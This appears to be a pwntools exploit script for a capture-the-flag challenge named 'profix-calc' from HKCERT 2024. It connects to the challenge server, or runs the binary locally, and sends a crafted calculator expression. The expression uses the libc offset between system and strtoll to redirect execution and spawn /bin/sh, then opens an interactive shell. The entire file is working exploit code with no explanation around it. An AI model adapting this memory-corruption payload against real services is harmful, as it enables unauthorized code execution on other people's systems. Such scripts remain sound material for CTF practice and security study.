#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")
libc = ELF("./libc_chal.so.6")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("c54-profix-calc.hkcert24.pwnable.hk", 1337, ssl = True)

    return r


def main():
    r = conn()

    # gdb.attach(r, "breakrva 0x14b5")

    r.sendline(f"+++*+*+*+**+++0*+{libc.sym.system - libc.sym.strtoll}++0;/bin/sh\x00".encode("ascii"))

    r.interactive("$ ")


if __name__ == "__main__":
    main()
